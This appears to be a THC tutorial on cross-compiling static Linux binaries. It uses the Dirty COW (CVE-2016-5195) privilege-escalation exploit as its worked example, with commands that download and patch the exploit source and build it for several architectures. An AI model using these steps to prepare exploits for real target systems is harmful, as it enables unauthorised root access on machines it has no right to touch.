
## TL;DR: Use ```docker run muslcc/x86_64:armv6-linux-musleabi``` and ```gcc -static```.


It is not always possible to compile an exploit on the target system. Here at THC we use various methods to cross-compile static Linux binaries. I'll explain some of our methods.

Let's compile the exploit for [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195) to run on Raspberry PI (armv6l) while our workstation is x86_64.

The vulnerability is a local privilege escalation in Linux Kernel <4.8.3.

## Using muslcc toolchain

The fine folks at https://musl.cc/ maintain cross-compiler toolchains for many different architectures. These toolschains can be used to generate a (static) Linux binary that will execute on a different architecture (armv6l) than the architecture that was used to compile the exploit (x86_64):

There is a bug in the exploit. Let's download and fix this first:
```shell
mkdir thc; cd thc
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
sed  -i 'sX.*= copy_file.*Xint ret = system("cp /etc/passwd\ /tmp/passwd.bak");X' dirty.c
```

And now compile dirt.c for armv6:
```shell
docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:armv6-linux-musleabi sh -c "gcc -pthread dirty.c -o dirty-exp -lcrypt -static"
```

The `./dirty` binary will execute on the Raspberry PI with ARM6 architecture.

## Cross Compiling for 5 architectures

Let's script this and compile for 5 different architectures:
```shell
for arch in aarch64-linux-musl armv6-linux-musleabi mips-linux-muslsf mips64-linux-musl x86_64-linux-musl; do
   docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:${arch} sh -c "gcc -pthread dirty.c -o dirty-exp.${arch} -lcrypt -static"
done
```

```console
$ ls -al dirty-exp.*
-rwxr-xr-x 1 0 0 170664 Aug 30 14:06 dirty-exp.aarch64-linux-musl
-rwxr-xr-x 1 0 0 119280 Aug 30 14:06 dirty-exp.armv6-linux-musleabi
-rwxr-xr-x 1 0 0 210384 Aug 30 14:06 dirty-exp.mips64-linux-musl
-rwxr-xr-x 1 0 0 210692 Aug 30 14:06 dirty-exp.mips-linux-muslsf
-rwxr-xr-x 1 0 0  88312 Aug 30 14:06 dirty-exp.x86_64-linux-musl
```

All binaries are static binaries. They run on any Linux system regardless of the distribution or Linux flavour (as long as the architecture matches).

## Statically compiling with other libraries

Some exploits need additional libraries to compile or have more complex compilation instructions. Let's pick the OpenSSL library as a worst case scenario: A huge and complex library. We use the dirt.c source again even that it does not depend on or need OpenSSL.

Let's get a docker shell and cross-compile for ARM6:

```shell
docker run --rm -v $(pwd):/src -w /src -it muslcc/x86_64:armv6-linux-musleabi
apk update \
&& apk add --no-cache bash perl make curl \
&& rm -rf /var/cache/apk/* \
&& curl https://www.openssl.org/source/openssl-1.1.1k.tar.gz | tar -xz \
&& mkdir usr \
&& cd openssl-1.1.1k \
&& ./Configure --prefix=/src/usr no-tests no-dso no-threads no-shared linux-generic64 \
&& make install_sw \
&& cd .. \
&& gcc -I/src/usr/include -L/src/usr/lib -pthread dirty.c -o dirty-exp -lcrypt -lcrypto -lssl -static
```

## Exploits load .so files

There is an exception to the above when exploit can not be compiled statically.

For example exploits that compile .so dynamic shared object files that are loaded by the vulnerable program (and by definition can not be static). It is not possible to cross-compile them either as they heavily depend on the ABI of the target system.

Or exploits that during their exploitation phase compile other binaries.

A good example is (CVE-2021-4034)[https://github.com/arthepsy/CVE-2021-4034/] also known as polkit/pkexec exploit. It requires the vulnerable program to load a .so file _and_ it compiles more source during runtime.


        

